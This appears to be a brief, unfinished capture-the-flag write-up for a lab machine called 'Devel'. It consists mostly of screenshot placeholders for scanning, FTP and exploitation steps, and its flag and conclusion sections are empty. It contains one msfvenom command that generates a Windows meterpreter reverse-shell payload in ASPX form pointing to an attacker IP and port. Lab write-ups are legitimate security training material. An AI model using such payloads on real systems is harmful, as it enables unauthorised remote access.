# Devel Report

## 1. Information Gathering

### Nmap
![[nmap.png]]

### Port 80
![[port-80.png]]

### FTP
![[ftp.png]]


## 2. Exploitation
![[put-test.png]]
![[test-success.png]]


```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f aspx -o venom.aspx
```


![[put-venom.png]]

![[metasploit.png]]

![[load-venom.png]]


### User Flag

### Root Flag

## 3. Conclusion